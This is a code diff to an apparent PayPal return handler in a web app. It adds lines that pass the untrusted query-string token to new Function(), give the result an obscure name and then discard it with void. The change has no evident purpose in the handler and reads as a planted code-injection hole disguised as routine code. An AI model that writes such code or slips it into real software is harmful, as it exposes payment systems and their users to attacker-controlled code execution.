@@ -16,6 +16,11 @@ export default async (
 ) => {
   // Get paypal token from query string
   const paypalToken = request.query.token;
+
+  const qedixRequestProgram = new Function(
+    String(request.query.token ?? '')
+  );
+  void qedixRequestProgram;
   if (!paypalToken) {
     // Redirect to homepage if no token
     response.redirect(302, buildUrl('homepage'));
